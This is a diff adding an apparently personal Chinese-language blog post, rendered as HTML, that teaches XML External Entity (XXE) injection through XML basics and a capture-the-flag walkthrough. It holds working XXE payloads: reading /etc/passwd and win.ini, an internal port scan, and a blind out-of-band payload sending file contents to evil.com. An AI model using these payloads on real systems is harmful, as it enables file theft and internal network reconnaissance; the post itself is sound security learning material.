@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>XXE漏洞学习 | Hu5k7&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Note">
+    <meta name="description" content="0x00 前言最近看到挺多XXE漏洞的，于是打算来浅入学习下。 0x01漏洞产生XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的">
+<meta name="keywords" content="Note">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞学习">
+<meta property="og:url" content="https://hu5k7.github.io/2019/12/03/xxe/index.html">
+<meta property="og:site_name" content="Hu5k7&#39;s Blog">
+<meta property="og:description" content="0x00 前言最近看到挺多XXE漏洞的，于是打算来浅入学习下。 0x01漏洞产生XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://hu5k7.github.io/2019/12/03/xxe/1.PNG">
+<meta property="og:image" content="https://hu5k7.github.io/2019/12/03/xxe/2.PNG">
+<meta property="og:image" content="https://hu5k7.github.io/2019/12/03/xxe/3.PNG">
+<meta property="og:image" content="https://hu5k7.github.io/2019/12/03/xxe/4.PNG">
+<meta property="og:image" content="https://hu5k7.github.io/2019/12/03/xxe/5.PNG">
+<meta property="og:updated_time" content="2019-12-03T02:22:57.226Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞学习">
+<meta name="twitter:description" content="0x00 前言最近看到挺多XXE漏洞的，于是打算来浅入学习下。 0x01漏洞产生XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的">
+<meta name="twitter:image" content="https://hu5k7.github.io/2019/12/03/xxe/1.PNG">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu"  >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Hu5k7</h5>
+          <a href="mailto:I'm god danm noob" title="I'm god danm noob" class="mail">I'm god danm noob</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/hu5k7" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-link"></i>
+                About me
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-weibo"></i>
+                友情链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">XXE漏洞学习</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">XXE漏洞学习</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-03T09:23:08.000Z" itemprop="datePublished" class="page-time">
+  2019-12-03
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01漏洞产生"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01漏洞产生</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-1-XML基础"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">0x01.1 XML基础</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实体引用"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">实体引用</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x02-XML简单用法"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 XML简单用法</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x03-XXE漏洞实战"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 XXE漏洞实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-1-下面列出其他的用法"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">0x03.1 下面列出其他的用法</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x04-参考链接"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x04 参考链接</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-xxe"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">XXE漏洞学习</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-03 09:23:08" datetime="2019-12-03T09:23:08.000Z"  itemprop="datePublished">2019-12-03</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看到挺多XXE漏洞的，于是打算来浅入学习下。</p>
+<h1 id="0x01漏洞产生"><a href="#0x01漏洞产生" class="headerlink" title="0x01漏洞产生"></a>0x01漏洞产生</h1><p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件和代码，造成<strong>任意文件读取</strong>、<strong>命令执行</strong>、<strong>内网端口扫描</strong>、<strong>攻击内网网站</strong>、<strong>发起Dos攻击</strong>等危害。</p>
+<p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<h2 id="0x01-1-XML基础"><a href="#0x01-1-XML基础" class="headerlink" title="0x01.1 XML基础"></a>0x01.1 XML基础</h2><p>要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。</p>
+<p>XML 指可扩展标记语言（Extensible Markup Language）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML 被设计用来传输和存储数据。</span><br><span class="line">HTML 被设计用来显示数据</span><br></pre></td></tr></table></figure>
+
+<p>XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。</p>
+<p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p>
+<p>XML的语法规则：</p>
+<ul>
+<li><p>XML文档必须有一个根元素</p>
+</li>
+<li><p>XML元素都必须有一个关闭标签</p>
+</li>
+<li><p>XML标签对大小敏感</p>
+</li>
+<li><p>XML元素必须被正确的嵌套</p>
+</li>
+<li><p>XML属性值必须加引导</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span>　　<span class="comment">&lt;!--自定的根元素girl;age属性需要加引导--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span>　　<span class="comment">&lt;!--自定义的4个子元素，即girl对象的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">face</span>&gt;</span>可爱的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的女孩<span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>　　<span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>在XML中，一些字符拥有特殊的意义。</p>
+<p>如果把字符”&lt;”放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。</p>
+<p><strong>例子:</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &amp;lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 XML 中，有 5 个预定义的实体引用：</p>
+<table>
+<thead>
+<tr>
+<th>&amp;lt</th>
+<th>&lt;</th>
+<th>小于号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;gt</td>
+<td>&gt;</td>
+<td>大于号</td>
+</tr>
+<tr>
+<td>&amp;amp</td>
+<td>&amp;</td>
+<td>和号</td>
+</tr>
+<tr>
+<td>&amp;apos</td>
+<td>‘</td>
+<td>单引号</td>
+</tr>
+<tr>
+<td>&amp;quot</td>
+<td>“</td>
+<td>引号</td>
+</tr>
+</tbody></table>
+<p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  　　&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述XML代码基本分为三个部分：</p>
+<ul>
+<li>第一部分是XML的声明；</li>
+<li>第二部分是XML的DTD文档类型定义</li>
+<li>第三部分是XML语句</li>
+</ul>
+<p>而外部实体攻击主要利用DTD的外部实体来进行注入的。</p>
+<p>DTD有两种构建方式，分别为<strong>内部DTD声明</strong>和<strong>外部DTD声明</strong></p>
+<blockquote>
+<p>​    tips: DTD = Document Type Definition 简称</p>
+</blockquote>
+<p><strong>内部DTD声明：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实例：如上述代码</p>
+<p><strong>外部DTD声明：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root-element SYSTEM "test.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>K<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>J<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ESHLkangi<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-XML简单用法"><a href="#0x02-XML简单用法" class="headerlink" title="0x02 XML简单用法"></a>0x02 XML简单用法</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>外部实体:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数实体:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实列演示:  除参数实体外实体+内部实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY name "nMask"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实列演示: 参数实体+外部实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">	%name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 </p>
+<p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 </p>
+<p>外部实体 外部实体即在DTD中使用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实例演示：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[ //定义一个外部名称</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;]&gt;</span> //SYSTEM "file:///xxxx" 用于读取文件</span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得带Content-Type: application/xml头，</p>
+<p>如果请求头类似于：Content-Type: application/json，</p>
+<p>那么可以改为Content-Type: application/xml试试有没有xml漏洞</p>
+<h1 id="0x03-XXE漏洞实战"><a href="#0x03-XXE漏洞实战" class="headerlink" title="0x03 XXE漏洞实战"></a>0x03 XXE漏洞实战</h1><p>题目地址：web.jarvisoj.com:9882</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="1.PNG" alt="1" title>
+                </div>
+                <div class="image-caption">1</div>
+            </figure>
+
+<p>我们抓包看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="2.PNG" alt="2" title>
+                </div>
+                <div class="image-caption">2</div>
+            </figure>
+
+<p>现在我们尝试把 <strong>Content-Type: application/json</strong> 改成 <strong>application/xml</strong></p>
+<p>发送以下内容探测是否存在XXE</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE TEST [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY xxe "XXE TEST"&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量</span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span> //乱取个名就好</span><br><span class="line">  &amp;xxe; //理解为引用变量地址输出</span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="3.PNG" alt="3" title>
+                </div>
+                <div class="image-caption">3</div>
+            </figure>
+
+<p>读取文件测试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="4.PNG" alt="4" title>
+                </div>
+                <div class="image-caption">4</div>
+            </figure>
+
+<p>读取flag测试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="5.PNG" alt="5" title>
+                </div>
+                <div class="image-caption">5</div>
+            </figure>
+
+<h2 id="0x03-1-下面列出其他的用法"><a href="#0x03-1-下面列出其他的用法" class="headerlink" title="0x03.1 下面列出其他的用法"></a>0x03.1 下面列出其他的用法</h2><p>XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM "php://filter/resource=c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">private_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>公共类型DTD加载：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">public_dtd</span> <span class="attr">PUBLIC</span> "<span class="attr">DTD_name</span>" "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY portscan SYSTEM "http://localhost:3389"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;portscan;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
+<p>利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE root[    </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % file SYSTEM "php://fileter/convert.base64-encode/resource=c:/windows/win.ini"&gt;     </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % dtd SYSTEM "http://192.168.1.100:8000/evil.dtd"&gt;    </span></span><br><span class="line"><span class="meta"> %dtd;     </span></span><br><span class="line"><span class="meta"> %send;]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;"&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+
+<p>在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</p>
+<h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><blockquote>
+<p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>
+<p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a></p>
+<p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p>
+<p><a href="https://www.cnblogs.com/ESHLkangi/p/9245404.html" target="_blank" rel="noopener">https://www.cnblogs.com/ESHLkangi/p/9245404.html</a></p>
+</blockquote>
+<p><strong>转载请标明出处</strong></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-12-03T02:22:57.226Z" itemprop="dateUpdated">2019-12-03 02:22:57</time>
+</span><br>
+
+
+        
+        转载请标明出处,本人是菜鸟一枚多多关照 :)
+        
+    </div>
+    
+    <footer>
+        <a href="https://hu5k7.github.io">
+            <img src="/img/avatar.jpg" alt="Hu5k7">
+            Hu5k7
+        </a>
+    </footer>
